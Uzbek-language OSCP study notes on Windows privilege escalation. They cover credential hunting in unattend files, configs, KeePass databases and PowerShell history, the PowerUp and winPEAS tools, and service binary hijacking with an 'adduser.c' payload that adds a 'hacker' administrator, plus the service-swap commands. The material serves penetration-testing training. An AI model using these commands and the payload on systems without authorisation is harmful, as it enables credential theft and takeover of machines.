# PEN-200: 16.1.3, 16.1.4, 16.1.5 & 16.2.1 — Windows Privilege Escalation Konspekti

Ushbu konspekt **OffSec PEN-200 (OSCP)** kursining Windows Privilege Escalation modulidagi 4 ta muhim bo'lim bo'yicha tayyorlandi:
* **16.1.3:** Hidden in Plain View (Ko'z o'ngidagi yashirin ma'lumotlar)
* **16.1.4:** Information Goldmine PowerShell (PowerShell — ma'lumotlar xazinasi)
* **16.1.5:** Automated Enumeration (Avtomatlashtirilgan qidiruv vositalari)
* **16.2.1:** Service Binary Hijacking (Servis binar faylini almashtirish orqali huquqni oshirish)

---

## 1-QISM: 16.1.3 — Hidden in Plain View (Ko'z o'ngidagi xazinalar)

Ko'pincha tizim ma'murlari yoki dasturchilar tizimni avtomatlashtirilgan holda o'rnatish, sozlash yoki zaxiralash jarayonida parollarni ochiq (plaintext) yoki oson shifrlangan (base64) holda konfiguratsiya fayllarida qoldirib ketishadi.

### 1. Asosiy qidiriladigan fayllar va joylar:
* **Unattended Windows Installations:**
  * Windows avtomatik o'rnatilganda administrator paroli quyidagi fayllarda qolib ketadi:
    * `C:\Windows\Panther\Unattend.xml`
    * `C:\Windows\Panther\Unattended.xml`
    * `C:\Windows\Panther\unattend.txt`
    * `C:\Windows\System32\Sysprep\unattend.xml`
    * `C:\Windows\System32\Sysprep\sysprep.xml`
  * Ushbu fayllar ichida `<AdministratorPassword>` yoki `<Password>` teglari bo'ladi (ko'pincha Base64 formatida yoki ochiq matnda).
* **Veb-server va Ilova sozlamalari:**
  * `web.config` (IIS yoki ASP.NET ma'lumotlar bazasi ulanishlari - ConnectionStrings)
  * `php.ini`, `httpd.conf`, `settings.json`, `appsettings.json`
  * `C:\xampp\htdocs\` yoki `C:\inetpub\wwwroot\`
* **KeePass va Parol menejerlari:**
  * `.kdbx` kengaytmali fayllar (KeePass database). Ularni yuklab olib, hashini chiqarib (`keepass2john`) John the Ripper yordamida parolini buzish mumkin.
* **Boshqa konfiguratsiya va loglar:**
  * `vnc.ini`, `unattend.txt`, `.git/config`, `*.vmdk`, `SiteList.xml` (McAfee).

### 2. Qidiruv buyruqlari (PowerShell & CMD):

* **KeePass fayllarini butun disk bo'ylab qidirish:**
  ```powershell
  Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
  ```

* **Panther va Sysprep fayllarini tekshirish:**
  ```powershell
  Get-ChildItem -Path C:\Windows\Panther\, C:\Windows\System32\Sysprep\ -Include *unattend*, *sysprep* -File -Recurse -ErrorAction SilentlyContinue
  ```

* **Konfiguratsiya va matnli fayllardan "password" so'zini qidirish:**
  ```powershell
  # PowerShell orqali:
  Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"

  # CMD orqali (juda tez va samarali):
  findstr /si "password" C:\*.xml C:\*.ini C:\*.txt C:\*.config
  ```

---

## 2-QISM: 16.1.4 — Information Goldmine PowerShell

PowerShell — zamonaviy Windows tizimlarida eng boy ma'lumot manbai hisoblanadi. Administratorlar va foydalanuvchilar bajargan har bir harakat iz qoldiradi.

### 1. PSReadLine — PowerShell Buyruqlar Tarixi (Command History)
PowerShell 5.0 dan boshlab kiritilgan har bir buyruq maxsus tarix fayliga saqlanib boradi. Agar administrator avvalroq buyruqlar satrida yangi foydalanuvchi yaratgan, tarmoqqa ulangan yoki credential kiritgan bo'lsa, bu fayl oltin kon hisoblanadi!

* **Tarix fayli joylashuvi:**
  `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
  *(To'liq yo'l: `C:\Users\<FOYDALANUVCHI>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`)*

* **Fayl yo'lini aniqlash va o'qish (PowerShell):**
  ```powershell
  # Yo'lini bilish:
  (Get-PSReadLineOption).HistorySavePath

  # To'g'ridan-to'g'ri o'qish:
  Get-Content (Get-PSReadLineOption).HistorySavePath
  ```

* **Barcha foydalanuvchilarning tarix fayllarini qidirish:**
  ```powershell
  Get-ChildItem -Path C:\Users\ -Filter "ConsoleHost_history.txt" -Recurse -Force -ErrorAction SilentlyContinue | Select-Object FullName
  ```

### 2. PowerShell Transkriptlari (Transcripts)
Tashkilotlarda PowerShell audit yoqilgan bo'lsa, barcha buyruqlar va ularning natijalari matn fayllariga yozib boriladi.
* Odatda `C:\Transcripts\` yoki foydalanuvchi profilida saqlanadi:
  ```powershell
  Get-ChildItem -Path C:\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue
  ```

### 3. PowerShell Environment Variables va Stored Credentials:
* **Muhit o'zgaruvchilarini tekshirish:**
  ```powershell
  Get-ChildItem env:
  ```
* **Tizimda saqlangan Windows hisob ma'lumotlari (Stored Credentials):**
  ```cmd
  cmdkey /list
  ```
  *(Agar credential saqlangan bo'lsa, `runas /savecred /user:Administrator cmd.exe` orqali admin huquqiga ega bo'lish mumkin).*

---

## 3-QISM: 16.1.5 — Automated Enumeration (Avtomatlashtirilgan vositalar)

Qo'lda qidirish bilan bir qatorda, vaqtni tejash va hech narsani o'tkazib yubormaslik uchun maxsus avtomatlashtirilgan skriptlar ishlatiladi.

### Asosiy Vositalar:
1. **PowerUp.ps1 (PowerSploit oilasi):**
   * PowerShell-da yozilgan, Windows servislar, registrlardagi zaifliklar va ruxsatlarni aniqlash uchun ideal.
   * **Ishlatish tartibi:**
     ```powershell
     powershell -ep bypass
     . .\PowerUp.ps1
     Invoke-AllChecks
     ```
   * *Natija:* Agar zaif servis yoki fayl topsa, `ServiceName`, `PathName` va ekspluatatsiya qilish uchun tayyor `Invoke-ServiceBinaryHijack` buyruqlarini tavsiya qiladi.

2. **winPEAS (Privilege Escalation Awesome Scripts):**
   * Windows-dagi deyarli BARCHA ma'lumotlarni tekshiradi: servislar, parollar, tarmoq, registr kalitlari, processlar.
   * **Ishlatish tartibi:**
     ```cmd
     winPEASx64.exe quiet cmd
     # Yoki faqat servis va tizim ma'lumotlari uchun:
     winPEASx64.exe quiet servicesinfo
     ```
   * *Ranglar qoidasi:*
     * **Qizil/Sariq (Red/Yellow):** 99% ehtimol bilan Privilege Escalation vektori!
     * **Qizil (Red):** Maxsus e'tibor qaratilishi kerak bo'lgan joylar.

3. **Seatbelt:**
   * C# da yozilgan GhostPack vositasi, xavfsizlik tekshiruvlari uchun juda aniq va toza hisobot beradi.

> ⚠️ **OffSec / OSCP Imtihon Eslatmasi:** WinPEAS va PowerUp.ps1 imtihonda ruxsat etilgan! Ammo ularning chiqargan natijalarini ko'r-ko'rona ishlatmasdan, har bir topilmani qo'lda (manual) tekshirib tasdiqlash shart!

---

## 4-QISM: 16.2.1 — Service Binary Hijacking (Servis binarini almashtirish)

Windows servislarining aksariyati eng yuqori daraja — **`NT AUTHORITY\SYSTEM`** (yoki `LocalSystem`) hisobi ostida ishlaydi. 

### Zaiflik Mantiqi:
Agar administrator noto'g'ri ruxsat bergan bo'lsa (misol uchun, dasturning `.exe` fayliga yoki uning turgan papkasiga oddiy `Users` yoki `Authenticated Users` guruhiga **Write (W)** yoki **Modify (M)** yoki **Full Control (F)** huquqi berilgan bo'lsa), tajovuzkor:
1. Asl `.exe` faylini o'zining zararli `.exe` fayli bilan almashtiradi (hijack).
2. Servisni qayta ishga tushiradi (`restart`).
3. Tizim servisni `SYSTEM` nomidan ishga tushiradi va tajovuzkorning kodi eng yuqori huquqda bajariladi!

---

### Ekspluatatsiya qilishning 4 ta Aniq Bosqichi:

#### 1-Bosqich: Servislarni ro'yxatga olish (Enumeration)
Avval tizimdagi barcha servislarni va ularning fayl yo'llarini ko'ramiz:
```powershell
Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName, StartMode | Where-Object {$_.State -eq "Running"}
```
*(Yoki CMD orqali: `sc.exe query type= service state= all`)*

#### 2-Bosqich: Binar fayl ruxsatlarini tekshirish (Permissions check)
Shubhali servisning ijro etiluvchi fayliga `icacls` orqali ruxsatlarni tekshiramiz:
```cmd
icacls "C:\Program Files\VulnerableService\service.exe"
```
**Nimalarga e'tibor beramiz:**
* `BUILTIN\Users:(F)` — Full Control (To'liq nazorat)
* `BUILTIN\Users:(M)` — Modify (O'zgartirish, o'chirish, yozish)
* `BUILTIN\Users:(W)` — Write (Yozish)
* `NT AUTHORITY\Authenticated Users:(M)` yoki `(F)`
> Agar ushbu ruxsatlardan biri bo'lsa — faylni almashtirish mumkin!

#### 3-Bosqich: Servisni to'xtatish va ishga tushirish huquqini tekshirish
Servisni qayta yuklashimiz mumkinmi?
```powershell
Restart-Service -Name <ServisNomi>
# Yoki:
Stop-Service -Name <ServisNomi>
Start-Service -Name <ServisNomi>
```
*(CMD orqali: `sc.exe stop <ServisNomi>` va `sc.exe start <ServisNomi>`)*

#### 4-Bosqich: Payload yaratish va binar faylni almashtirish
OffSec PEN-200 kursida eng ishonchli va sevimli usul — bu yangi admin foydalanuvchi qo'shuvchi kichik C dasturi:

**`adduser.c` kodi:**
```c
#include <windows.h>
#include <stdlib.h>

int main() {
    // Yangi 'hacker' foydalanuvchisini qo'shish
    system("net user hacker Password123! /add");
    // Uni mahalliy Administratorlar guruhiga kiritish
    system("net localgroup administrators hacker /add");
    return 0;
}
```

* **Kali Linux-da kompilyatsiya qilish:**
  ```bash
  x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
  ```

* **Windows-da faylni almashtirish:**
  ```powershell
  # 1. Asl faylni zaxiralash
  Move-Item "C:\Program Files\VulnerableService\service.exe" "C:\Program Files\VulnerableService\service.exe.bak"

  # 2. Zararli adduser.exe faylini xizmat nomi bilan joylashtirish
  Copy-Item .\adduser.exe "C:\Program Files\VulnerableService\service.exe"

  # 3. Servisni qayta ishga tushirish
  Restart-Service -Name VulnerableService
  ```

* **Natijani tekshirish:**
  ```powershell
  net localgroup administrators
  ```
  *(Ro'yxatda `hacker` foydalanuvchisi paydo bo'ladi! Endi `hacker` akkaunti orqali to'liq admin sifatida kirish mumkin).*

---

## Tezkor Cheat-Sheet Jadvali

| Bo'lim | Maqsad | Asosiy Buyruq / Usul | Kutilgan Natija |
| :--- | :--- | :--- | :--- |
| **16.1.3** | Ochiq parollarni qidirish | `Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue` | KeePass parollar bazasi |
| **16.1.3** | Unattend fayllari | `Get-ChildItem C:\Windows\Panther\ -Filter *unattend*.xml` | Plaintext / Base64 admin paroli |
| **16.1.4** | PowerShell buyruqlar tarixi | `Get-Content (Get-PSReadLineOption).HistorySavePath` | Admin kiritgan maxfiy buyruq va parollar |
| **16.1.4** | Saqlangan loginlar | `cmdkey /list` | `runas /savecred` orqali admin bo'lish |
| **16.1.5** | Avtomatlashtirilgan tekshiruv | `PowerUp.ps1` -> `Invoke-AllChecks` | Zaif servislar va konfiguratsiyalar |
| **16.1.5** | Tizimli skaner | `winPEASx64.exe quiet cmd` | Qizil rangli PrivEsc yo'llari |
| **16.2.1** | Servis binar ruxsati | `icacls "C:\Path\To\Binary.exe"` | `(M)` yoki `(F)` yozish ruxsati |
| **16.2.1** | Servisni qayta yuklash | `Restart-Service -Name <Xizmat>` yoki `sc.exe stop/start` | SYSTEM huquqida kod ijro etilishi |
